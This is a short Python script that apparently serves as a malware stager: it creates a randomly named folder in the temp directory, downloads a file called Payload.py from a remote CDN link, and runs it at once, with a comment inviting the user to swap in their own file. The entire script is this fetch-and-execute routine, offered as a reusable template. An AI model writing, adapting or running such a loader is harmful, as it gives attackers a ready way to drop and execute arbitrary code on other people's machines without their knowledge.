# Imports.
import os
import requests
import shutil
import random
import tempfile

ABC = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"] # For random file name.

def generateFiles(): # Generate / Download the file.
    temp = ""
    for i in range(0,20):
        temp = temp + str(ABC[random.randint(0,len(ABC)-1)]) # Creates a folder named with random characters in /Temp.

    full_path = os.path.join(tempfile.gettempdir(), str(temp)) # Creates full path from current dir.

    os.mkdir(full_path) # Create path.
    
    os.chdir(full_path) # Goes to Temp Folder DIR.
    
    file_url = "https://gitcdn.link/cdn/NightTabGit/PyTemp-1/main/Payload.py" # Replace with your own file.
    filename = file_url.split("/")[-1]
    r = requests.get(file_url, stream = True)
    if r.status_code == 200:
        r.raw.decode_content = True
        with open(filename,'wb') as f:
            shutil.copyfileobj(r.raw, f) # Creates file locally.
    else:
        pass
    
    os.system('Payload.py') # Runs new Payload.

generateFiles() # Execute.
